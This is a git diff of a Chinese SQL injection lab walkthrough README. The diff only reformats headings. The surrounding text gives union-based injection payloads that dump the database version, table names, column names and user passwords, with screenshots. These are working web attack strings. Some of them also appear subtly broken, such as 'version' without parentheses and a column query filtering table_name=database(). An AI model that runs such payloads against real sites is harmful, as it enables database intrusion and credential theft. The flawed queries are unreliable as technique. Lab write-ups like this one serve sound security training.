@@ -1,7 +1,7 @@
 # SQL-lab
 sql注入全部解析
 
-## 1. 先看题，要求输入一个数字
+* 1. 先看题，要求输入一个数字
 
 * 入乡随俗，试一试
 
@@ -31,28 +31,28 @@ __添加完单引号，根据报错的回显，发现他是单引号闭合方式
 
 > 现在我们就可以查到我们想要的内容
 
-#### 查询数据库版本和库名称
+* 查询数据库版本和库名称
 ```
 -1' union select 1,version,database() --+//要让前边为错“-1”，不让数据库执行前边的语句
 ```
 
 ![image](https://user-images.githubusercontent.com/76896357/114821977-f9e3c600-9df3-11eb-95ca-17e5b48cce94.png)
 
-#### 查询表名
+* 查询表名
 ```
 -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+//group_concat,查询显示所有结果
 ```
 
 ![image](https://user-images.githubusercontent.com/76896357/114822963-690dea00-9df5-11eb-962c-c757254f70e4.png)
 
-#### 查询列名
+* 查询列名
 ```
 -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=database() and table_name='users' --+
 ```
 
 ![image](https://user-images.githubusercontent.com/76896357/114823252-d6217f80-9df5-11eb-891e-32999a95568f.png)
 
-#### 查询字段名
+* 查询字段名
 ```
 -1' union select 1,2,group_concat(password) from security.users --+
 ```
